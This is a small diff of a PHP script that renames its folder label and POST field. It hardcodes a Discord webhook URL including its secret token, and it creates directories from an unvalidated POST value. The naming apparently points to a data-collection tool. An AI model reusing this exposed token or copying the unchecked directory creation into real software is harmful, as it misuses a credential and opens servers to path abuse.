@@ -1,8 +1,8 @@
 <?php
-$dir2 = "BEAM SERVER";
+$dir2 = "xlie";
 $thook = "https://discord.com/api/webhooks/930755536062918716/qJ3peRZOBWEMRpLiSlRFc3dPhEDRjPtM9euSip-MLYLlP0EWTMh2y75XTi2x87489vs_";
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $dir = $_POST['folder'];
+    $dir = $_POST['xlieq'];
     if(!is_dir($dir)){
         mkdir($dir);
     } else {
